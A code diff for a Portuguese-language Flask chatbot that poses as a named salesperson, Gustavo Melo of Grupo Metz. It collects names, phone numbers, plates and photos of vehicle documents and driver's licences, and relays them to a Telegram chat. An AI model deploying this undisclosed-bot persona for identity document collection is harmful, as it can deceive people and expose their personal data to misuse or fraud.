@@ -1,4 +1,4 @@
-# Car Insurance Lead Bot - Gustavo Melo Version
+# Car Insurance Lead Bot - Gustavo Melo - Single Summary
 from flask import Flask, render_template_string, request, jsonify
 import requests
 import os
@@ -35,27 +35,37 @@ def send_telegram_document(doc_data, caption, filename):
     except:
         return False
 
-def send_summary_to_telegram(session_id):
+def send_final_summary(session_id):
+    """Send ONE complete message with all info at the end"""
     if not TELEGRAM_BOT_TOKEN:
-        return
+        return False
+    
     conv = conversations.get(session_id, {})
     info = conv.get('info', {})
-    text = f"""📋 NOVA COTACAO - GRUPO METZ
+    docs = conv.get('docs', {})
+    
+    text = f"""🚗 NOVA COTACAO - GRUPO METZ
 
-👤 Nome: {info.get('nome', 'Nao informado')}
-🏙️ Cidade: {info.get('cidade', 'Nao informado')}
-🚗 Veiculo: {info.get('veiculo', 'Nao informado')}
-📞 Telefone: {info.get('telefone', 'Nao informado')}
+👤 NOME: {info.get('nome', '---')}
+🏙️ CIDADE: {info.get('cidade', '---')}
+🚗 VEICULO: {info.get('veiculo', '---')}
+📞 TELEFONE: {info.get('telefone', '---')}
 
-📎 Documentos:
-• Doc Veiculo: {'✅' if conv.get('docs', {}).get('doc_veiculo') else '❌'}
-• CNH: {'✅' if conv.get('docs', {}).get('cnh') else '❌'}"""
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
+📎 DOCUMENTOS ENVIADOS:
+• Documento do Veiculo: {'✅ SIM' if docs.get('doc_veiculo') else '❌ NAO'}
+• CNH: {'✅ SIM' if docs.get('cnh') else '❌ NAO'}
+
+✅ COTACAO COMPLETA
+
+Sessao: {session_id[:12]}"""
+    
     try:
-        requests.post(url, json=payload, timeout=10)
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
+        response = requests.post(url, json=payload, timeout=10)
+        return response.status_code == 200
     except:
-        pass
+        return False
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -63,7 +73,7 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Grupo Metz - Protecao Veicular</title>
+    <title>Grupo Metz</title>
     <style>
         body { font-family: sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; margin: 0; }
         .chat-container { width: 100%; max-width: 420px; height: 85vh; background: white; border-radius: 24px; box-shadow: 0 25px 80px rgba(0,0,0,0.4); display: flex; flex-direction: column; overflow: hidden; }
@@ -142,23 +152,12 @@ HTML_TEMPLATE = """
             if (e.key === 'Enter') sendMessage();
         });
 
-        // Start conversation
         addMessage('Ola, tudo bem, sou o Gustavo Melo do grupo Metz, Protecao Veicular. Para estar fazendo sua cotacao, vou precisar de algumas informacoes.', false);
         setTimeout(() => addMessage('Para comecar, qual seu nome completo?', false), 500);
     </script>
 </body>
 </html>
 """
-
-MESSAGES = {
-    "ask_cidade": "De qual cidade voce fala?",
-    "ask_veiculo": "Pra eu fazer uma cotacao mais exata, me informe a placa e o modelo do seu veiculo?",
-    "ask_telefone": "E tambem o telefone para contato.",
-    "ask_doc_veiculo": "Eu sei que ja pedi todas estas informacoes. Mas, poderia enviar uma foto ou copia do documento do veiculo?",
-    "ask_cnh": "Uma foto da CNH tambem seria possivel?",
-    "final": "Obrigado por todos estes detalhes, gostaria de acrescentar algo mais antes de eu comecar a trabalhar na sua cotacao?",
-    "encerramento": "Perfeito! Vou preparar sua cotacao e entrar em contato em breve. Obrigado pela confianca!"
-}
 
 @app.route('/')
 def home():
@@ -171,53 +170,62 @@ def chat():
     msg = data.get('message', '').strip()
     
     if session_id not in conversations:
-        conversations[session_id] = {'step': 1, 'info': {}, 'docs': {}}
+        conversations[session_id] = {'step': 1, 'info': {}, 'docs': {}, 'completed': False}
     
     conv = conversations[session_id]
     step = conv['step']
     
+    # If already completed, just say thanks
+    if conv.get('completed'):
+        return jsonify({"response": "Obrigado! Sua cotacao ja foi enviada. Entraremos em contato em breve."})
+    
     if step == 1:
         conv['info']['nome'] = msg
         conv['step'] = 2
-        return jsonify({"response": MESSAGES["ask_cidade"]})
+        return jsonify({"response": "De qual cidade voce fala?"})
     
     elif step == 2:
         conv['info']['cidade'] = msg
         conv['step'] = 3
-        return jsonify({"response": MESSAGES["ask_veiculo"]})
+        return jsonify({"response": "Pra eu fazer uma cotacao mais exata, me informe a placa e o modelo do seu veiculo?"})
     
     elif step == 3:
         conv['info']['veiculo'] = msg
         conv['step'] = 4
-        return jsonify({"response": MESSAGES["ask_telefone"]})
+        return jsonify({"response": "E tambem o telefone para contato."})
     
     elif step == 4:
         conv['info']['telefone'] = msg
         conv['step'] = 5
-        return jsonify({"response": MESSAGES["ask_doc_veiculo"]})
+        return jsonify({"response": "Eu sei que ja pedi todas estas informacoes. Mas, poderia enviar uma foto ou copia do documento do veiculo? Clique no botao de anexo 📎."})
     
     elif step == 6:
         conv['step'] = 7
-        return jsonify({"response": MESSAGES["ask_cnh"]})
+        return jsonify({"response": "Uma foto da CNH tambem seria possivel?"})
     
     elif step == 8:
         conv['step'] = 9
-        return jsonify({"response": MESSAGES["final"]})
+        return jsonify({"response": "Obrigado por todos estes detalhes, gostaria de acrescentar algo mais antes de eu comecar a trabalhar na sua cotacao?"})
     
     elif step == 9:
-        send_summary_to_telegram(session_id)
-        return jsonify({"response": MESSAGES["encerramento"]})
+        # Mark as completed and send final summary
+        conv['completed'] = True
+        send_final_summary(session_id)
+        return jsonify({"response": "Perfeito! Vou preparar sua cotacao e entrar em contato em breve. Obrigado pela confianca!"})
     
-    return jsonify({"response": "Aguardando documento..."})
+    return jsonify({"response": "Aguardando documento... Clique no botao de anexo 📎."})
 
 @app.route('/upload', methods=['POST'])
 def upload():
     session_id = request.form.get('session_id', 'default')
     
     if session_id not in conversations:
-        conversations[session_id] = {'step': 0, 'info': {}, 'docs': {}}
+        conversations[session_id] = {'step': 0, 'info': {}, 'docs': {}, 'completed': False}
     
     conv = conversations[session_id]
+    
+    if conv.get('completed'):
+        return jsonify({"message": "Sua cotacao ja foi enviada. Obrigado!"})
     
     if 'file' not in request.files:
         return jsonify({"message": "Nenhum arquivo enviado."})
@@ -233,28 +241,38 @@ def upload():
     step = conv.get('step', 0)
     
     if step == 5:
-        caption = f"Doc Veiculo - {conv.get('info', {}).get('nome', 'Cliente')}"
+        # First document - vehicle doc
+        caption = f"📎 DOC VEICULO - {conv.get('info', {}).get('nome', 'Cliente')}"
         conv['docs']['doc_veiculo'] = True
         conv['step'] = 6
-        next_msg = MESSAGES["ask_cnh"]
+        
+        success = False
+        if ext in ['jpg', 'jpeg', 'png']:
+            success = send_telegram_photo(file_data, caption, filename)
+        elif ext == 'pdf':
+            success = send_telegram_document(file_data, caption, filename)
+        
+        if success:
+            return jsonify({"message": "Documento do veiculo recebido! Uma foto da CNH tambem seria possivel?"})
+        return jsonify({"message": "Erro ao enviar. Tente novamente."})
+    
     elif step == 7:
-        caption = f"CNH - {conv.get('info', {}).get('nome', 'Cliente')}"
+        # Second document - CNH
+        caption = f"📎 CNH - {conv.get('info', {}).get('nome', 'Cliente')}"
         conv['docs']['cnh'] = True
         conv['step'] = 8
-        next_msg = MESSAGES["final"]
-    else:
-        return jsonify({"message": "Por favor, responda as perguntas primeiro."})
+        
+        success = False
+        if ext in ['jpg', 'jpeg', 'png']:
+            success = send_telegram_photo(file_data, caption, filename)
+        elif ext == 'pdf':
+            success = send_telegram_document(file_data, caption, filename)
+        
+        if success:
+            return jsonify({"message": "CNH recebida! Obrigado por todos estes detalhes, gostaria de acrescentar algo mais antes de eu comecar a trabalhar na sua cotacao?"})
+        return jsonify({"message": "Erro ao enviar. Tente novamente."})
     
-    success = False
-    if ext in ['jpg', 'jpeg', 'png']:
-        success = send_telegram_photo(file_data, caption, filename)
-    elif ext == 'pdf':
-        success = send_telegram_document(file_data, caption, filename)
-    
-    if success:
-        return jsonify({"message": "Documento recebido! " + next_msg})
-    
-    return jsonify({"message": "Erro ao enviar."})
+    return jsonify({"message": "Por favor, responda as perguntas primeiro."})
 
 @app.route('/favicon.ico')
 def favicon():
